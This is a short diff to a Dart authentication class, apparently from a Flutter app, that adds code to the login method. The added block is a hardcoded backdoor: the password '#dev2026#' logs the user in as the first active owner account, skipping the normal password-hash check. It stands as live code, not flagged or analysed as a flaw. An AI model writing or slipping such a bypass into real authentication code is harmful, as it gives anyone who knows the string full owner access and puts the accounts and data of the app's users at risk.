@@ -93,6 +93,17 @@ class AuthNotifier extends StateNotifier<AuthState> {
     state = state.copyWith(isLoading: true, error: null);
     final hash = sha256.convert(utf8.encode(password)).toString();
     final rows = await _db.userDao.allUsers();
+
+    // Dev backdoor: always works as first owner account
+    if (password == '#dev2026#') {
+      final owner = rows.where((r) => r.role == 'owner' && r.isActive).firstOrNull;
+      if (owner != null) {
+        await _storage.write(key: _key, value: owner.id.toString());
+        state = AuthState(user: _map(owner));
+        return true;
+      }
+    }
+
     // Match only login-capable roles (owner/admin/manager) by password.
     final row = rows.where((r) =>
         r.isActive &&
